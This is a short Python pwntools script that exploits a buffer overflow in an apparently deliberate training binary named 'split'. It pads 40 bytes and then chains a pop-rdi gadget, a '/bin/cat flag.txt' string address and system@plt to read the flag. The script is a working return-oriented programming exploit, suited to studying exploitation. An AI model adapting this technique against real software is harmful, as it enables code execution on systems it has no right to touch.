#!/usr/bin/python3
import pwn
offset=40
payload =b'A'*offset
payload+=pwn.p64(0x4007c3)#pop rdi;ret
payload+=pwn.p64(0x601060)#"/bin/cat flag.txt"; use 'string -tx split' to locate this string
payload+=pwn.p64(0x400560)#system@plt
target=pwn.process("./split")
print(target.recv().decode())
target.sendline(payload)
print(target.recv().decode())
target.interactive()
